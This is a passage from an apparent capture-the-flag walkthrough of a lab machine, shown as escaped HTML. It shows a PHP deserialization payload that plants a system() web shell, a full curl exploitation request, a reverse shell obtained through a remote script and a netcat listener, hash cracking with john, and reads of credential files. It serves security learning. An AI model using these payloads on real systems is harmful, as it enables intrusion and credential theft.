&lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;serialize&lt;/span&gt;($newObj);

&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Let&amp;rsquo;s run add this PHP code in a local file and run it.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://umar0x01.sh/img/debug-thm/Pasted%20image%2020210403142007.png&#34; alt=&#34;Pasted image 20210403142007.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;Alright, we get the serialized string:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;O:10:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;FormSubmit&amp;#34;&lt;/span&gt;:2:&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;s:9:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;form_file&amp;#34;&lt;/span&gt;;s:12:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;umar0x01.php&amp;#34;&lt;/span&gt;;s:7:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;message&amp;#34;&lt;/span&gt;;s:28:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;lt;?php system(&lt;/span&gt;$_GET&lt;span style=&#34;color:#e6db74&#34;&gt;[123]); ?&amp;gt;&amp;#34;&lt;/span&gt;;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Let me try and walk you through the whole serialized string.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;O&lt;/code&gt; means object&lt;/li&gt;
&lt;li&gt;&lt;code&gt;O:10&lt;/code&gt; means object name&amp;rsquo;s length (i.e. -&amp;gt; 10)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;2:{&lt;/code&gt; means there are two properties/attributes&lt;/li&gt;
&lt;li&gt;&lt;code&gt;s:9&lt;/code&gt; means that our property/attribute is a string and is of length of 9 chars&lt;/li&gt;
&lt;li&gt;&lt;code&gt;s:9:&amp;quot;form_file&amp;quot;;&lt;/code&gt; Length of 9 and property name&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Probably, that explained the serialized string. You can always google for more details!&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Now, we need to URL encode our string and pass it into the &lt;code&gt;debug&lt;/code&gt; parameter in the application.&lt;/p&gt;
&lt;p&gt;For URL encoding, I&amp;rsquo;ll use &lt;a href=&#34;https://gchq.github.io/CyberChef&#34;&gt;cyberchef&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://umar0x01.sh/img/debug-thm/Pasted%20image%2020210403142403.png&#34; alt=&#34;Pasted image 20210403142403.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;URL Encoded string looks like:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;O%3A10%3A%22FormSubmit%22%3A2%3A%7Bs%3A9%3A%22form%5Ffile%22%3Bs%3A12%3A%22umar0x01%2Ephp%22%3Bs%3A7%3A%22message%22%3Bs%3A28%3A%22%3C%3Fphp%20system%28%24%5FGET%5B123%5D%29%3B%20%3F%3E%22%3B%7D
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Let&amp;rsquo;s pass this in the URL and see if our new file get&amp;rsquo;s created.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://umar0x01.sh/img/debug-thm/Pasted%20image%2020210403142455.png&#34; alt=&#34;Pasted image 20210403142455.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;Yay! It did, the string printed in the bottom indicates that.&lt;/p&gt;
&lt;p&gt;Here&amp;rsquo;s the cURL request, if you&amp;rsquo;ve problems reproducing the above:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;curl -i &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://10.10.51.225/index.php?debug=O%3A10%3A%22FormSubmit%22%3A2%3A{s%3A9%3A%22form_file%22%3Bs%3A12%3A%22umar0x01.php%22%3Bs%3A7%3A%22message%22%3Bs%3A28%3A%22%3C%3Fphp%20system(%24_GET[123])%3B%20%3F%3E%22%3B}&amp;#39;&lt;/span&gt; --globoff &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;-H &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;-H &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;-H &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Accept-Language: en-US,en;q=0.5&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;-H &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Connection: close&amp;#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&amp;ndash;&lt;/p&gt;
&lt;p&gt;Now, let&amp;rsquo;s access the .php file with our RCE code in it and get reverse shell!&lt;/p&gt;
&lt;p&gt;&amp;ndash;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;view-source:http://10.10.51.225/umar0x01.php?123=ls%20-la
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://umar0x01.sh/img/debug-thm/Pasted%20image%2020210403142819.png&#34; alt=&#34;Pasted image 20210403142819.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;ndash;&lt;/p&gt;
&lt;p&gt;We can generate RCE payloads to fallback if something isn&amp;rsquo;t present utilizing &lt;a href=&#34;https://reverse-shell.sh&#34;&gt;reverse-shell.sh&lt;/a&gt; and call it with cURL.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://umar0x01.sh/img/debug-thm/Pasted%20image%2020210403142924.png&#34; alt=&#34;Pasted image 20210403142924.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;ndash;&lt;/p&gt;
&lt;p&gt;I&amp;rsquo;ll let you figure out what&amp;rsquo;s happening below, just remember that I wrote the above shell script generated in a file named &lt;code&gt;shell.sh&lt;/code&gt; in my local directory since the machine doesn&amp;rsquo;t have access to the internet.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://umar0x01.sh/img/debug-thm/banner.png&#34; alt=&#34;Pasted image 20210403143158.png&#34;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;reverse-shell&#34;&gt;Reverse Shell:&lt;/h3&gt;
&lt;p&gt;Now that we&amp;rsquo;ve reverse shell, let&amp;rsquo;s try and get tty shell and make it interactive!&lt;/p&gt;
&lt;p&gt;&amp;ndash;&lt;/p&gt;
&lt;p&gt;First, we&amp;rsquo;ll get the tty shell using python&amp;rsquo;s onliner:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;python3 -c &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;__import__(&amp;#39;pty&amp;#39;).spawn(&amp;#39;/bin/bash&amp;#39;)&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;â”Œâ”€â”€&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;rootðŸ’€b0x&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;/mnt/hgfs/THM/Debug&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
â””â”€# nc -nlvp &lt;span style=&#34;color:#ae81ff&#34;&gt;4444&lt;/span&gt;                              
listening on &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;any&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4444&lt;/span&gt; ...
connect to &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;10.17.0.120&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; from &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;UNKNOWN&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;10.10.51.225&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;50224&lt;/span&gt;
/bin/sh: 0: can&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;t access tty; job control turned off
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;$ id
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;uid=33(www-data) gid=33(www-data) groups=33(www-data)
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;$ which python
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;/usr/bin/python
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;$ which python3
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;/usr/bin/python3
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;$ python3 -c &amp;#34;__import__(&amp;#39;&lt;/span&gt;pty&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;).spawn(&amp;#39;&lt;/span&gt;/bin/bash&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;www-data@osboxes:/var/www/html&lt;/span&gt;$&lt;span style=&#34;color:#e6db74&#34;&gt; 
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;www-data@osboxes:/var/www/html&lt;/span&gt;$&lt;span style=&#34;color:#e6db74&#34;&gt; id
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;id
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;uid=33(www-data) gid=33(www-data) groups=33(www-data)
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;www-data@osboxes:/var/www/html&lt;/span&gt;$&lt;span style=&#34;color:#e6db74&#34;&gt; 
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;www-data@osboxes:/var/www/html&lt;/span&gt;$&lt;span style=&#34;color:#e6db74&#34;&gt; 
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&amp;ndash;&lt;/p&gt;
&lt;p&gt;Now that we&amp;rsquo;ve tty shell, let&amp;rsquo;s make it interactive (i.e. Ctrl + C or other things don&amp;rsquo;t exit the shell!)&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;Note:&lt;/strong&gt; We need bash shell to make it interactive!&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Type: &amp;lsquo;Ctrl + Z&amp;rsquo; and background the process.&lt;/p&gt;
&lt;p&gt;Now we&amp;rsquo;ll use:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;stty raw -echo
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And then type &lt;code&gt;fg&lt;/code&gt; to foreground the process (get it back)&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://umar0x01.sh/img/debug-thm/Pasted%20image%2020210403143723.png&#34; alt=&#34;Pasted image 20210403143723.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;ndash;&lt;/p&gt;
&lt;p&gt;Now that we&amp;rsquo;ve interactive shell, let&amp;rsquo;s add the &lt;em&gt;rows/cols (generic)&lt;/em&gt; and add some &lt;strong&gt;colors UwU&lt;/strong&gt;!&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;PS1&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ &amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# green&lt;/span&gt;
alias ls&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ls --color=auto&amp;#39;&lt;/span&gt;
alias grep&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;grep --color=auto&amp;#39;&lt;/span&gt;
alias fgrep&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;fgrep --color=auto&amp;#39;&lt;/span&gt;
alias egrep&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;egrep --color=auto&amp;#39;&lt;/span&gt;
alias ll&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ls -alFh&amp;#39;&lt;/span&gt;
alias la&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ls -A&amp;#39;&lt;/span&gt;
alias l&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ls -CF&amp;#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://umar0x01.sh/img/debug-thm/Pasted%20image%2020210403143941.png&#34; alt=&#34;Pasted image 20210403143941.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;ndash;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;stty rows &lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt;
stty columns &lt;span style=&#34;color:#ae81ff&#34;&gt;211&lt;/span&gt;
export TERM&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;screen
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://umar0x01.sh/img/debug-thm/Pasted%20image%2020210403144025.png&#34; alt=&#34;Pasted image 20210403144025.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;ndash;&lt;/p&gt;
&lt;p&gt;Alright, we got the initial shell and it&amp;rsquo;s fully interactive! Time to get the initial flag and privesc our way to root!&lt;/p&gt;
&lt;p&gt;&amp;ndash;&lt;/p&gt;
&lt;p&gt;We can find a &lt;code&gt;.htpasswd&lt;/code&gt; (usually used for &lt;strong&gt;HTTP authentication&lt;/strong&gt;) file right in &lt;code&gt;/var/www/html/&lt;/code&gt; containing the following credentials:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;www-data@osboxes:/var/www/html$ cat .htpasswd 
james:$apr1$zPZMix2A$d8fBXH0em33bfI9UTt9Nq1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Let&amp;rsquo;s run john and try to crack these.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;â”Œâ”€â”€&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;rootðŸ’€b0x&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;/mnt/hgfs/THM/Debug&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
â””â”€# john htpasswd.hash                           
Warning: detected hash type &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;md5crypt&amp;#34;&lt;/span&gt;, but the string is also recognized as &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;md5crypt-long&amp;#34;&lt;/span&gt;
Use the &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;--format=md5crypt-long&amp;#34;&lt;/span&gt; option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; password hash &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;md5crypt, crypt&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;3&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; $1$ &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;and variants&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;MD5 256/256 AVX2 8x3&lt;span style=&#34;color:#f92672&#34;&gt;])&lt;/span&gt;
Will run &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; OpenMP threads
Proceeding with single, rules:Single
Press &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;q&amp;#39;&lt;/span&gt; or Ctrl-C to abort, almost any other key &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; status
Almost &lt;span style=&#34;color:#66d9ef&#34;&gt;done&lt;/span&gt;: Processing the remaining buffered candidate passwords, &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; any.
Warning: Only &lt;span style=&#34;color:#ae81ff&#34;&gt;84&lt;/span&gt; candidates buffered &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; the current salt, minimum &lt;span style=&#34;color:#ae81ff&#34;&gt;96&lt;/span&gt; needed &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; performance.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
jamaica          &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;james&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
1g 0:00:00:00 DONE 2/3 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;2021-04-03 14:42&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; 20.00g/s 41760p/s 41760c/s 41760C/s bigdog..88888888
Use the &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;--show&amp;#34;&lt;/span&gt; option to display all of the cracked passwords reliably
Session completed

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://umar0x01.sh/img/debug-thm/Pasted%20image%2020210403144206.png&#34; alt=&#34;Pasted image 20210403144206.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;ndash;&lt;/p&gt;
&lt;p&gt;We get a password: &lt;strong&gt;jamaica&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Where can we use it? Let&amp;rsquo;s see &lt;code&gt;/etc/passwd&lt;/code&gt; file if it contains any other users except for &lt;code&gt;www-data&lt;/code&gt; and &lt;code&gt;root&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;www-data@osboxes:/var/www/html$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;admin&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;:/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:109:117::/nonexistent:/bin/false
avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
saned:x:119:127::/var/lib/saned:/bin/false
usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
james:x:1001:1001::/home/james:/bin/bash
sshd:x:121:65534::/var/run/sshd:/usr/sbin/nologin
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Alright, we can try the credentials against the user: &lt;code&gt;james&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://umar0x01.sh/img/debug-thm/Pasted%20image%2020210403144400.png&#34; alt=&#34;Pasted image 20210403144400.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;ndash;&lt;/p&gt;
&lt;h4 id=&#34;flag-usertxt&#34;&gt;Flag (user.txt)&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://umar0x01.sh/img/debug-thm/Pasted%20image%2020210403144420.png&#34; alt=&#34;Pasted image 20210403144420.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;ndash;&lt;/p&gt;
&lt;p&gt;Time for privesc!&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;privileges-escalation&#34;&gt;Privileges Escalation&lt;/h3&gt;
&lt;p&gt;Before running LinEnum, LSE or LinPeas, let&amp;rsquo;s try and do some manual enumeration first!&lt;/p&gt;
&lt;p&gt;&amp;ndash;&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s try and get the list of binaries we can run with sudo!&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;james@osboxes:~$ sudo -l 
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;sudo&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; password &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; james: 
Sorry, user james may not run sudo on osboxes.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Nothing we can run with sudo! :(&lt;/p&gt;
&lt;p&gt;&amp;ndash;&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s try and list the crontabs (if any)&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;james@osboxes:~$ crontab -l
no crontab &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; james
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Nothing there as well!&lt;/p&gt;
&lt;p&gt;&amp;ndash;&lt;/p&gt;
&lt;p&gt;We can see that &lt;code&gt;.bash_history&lt;/code&gt; is present in the directry, let&amp;rsquo;s check it out.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;james@osboxes:~$ cat .bash_history
ls
clear
exit
ls
clear
exit
ls
clear
exit
ls
cd /home/james/
ls
cat Note-To-James.txt 
ls
cd /etc/update-motd.d/
ls
ls -la
ls
clear
ls
clear
ls
clera
ls
clear
ls
clear
ls -la
cd /
ls
cd /root/
ls
exit
ls
clear
exit
nano id_rsa
chmod &lt;span style=&#34;color:#ae81ff&#34;&gt;600&lt;/span&gt; id_rsa 
ssh -i id_rsa root@10.250.0.12
exit
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&amp;ndash;&lt;/p&gt;
&lt;p&gt;We&amp;rsquo;ve a note file in the local directory:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;james@osboxes:~$ cat Note-To-James.txt
Dear James,

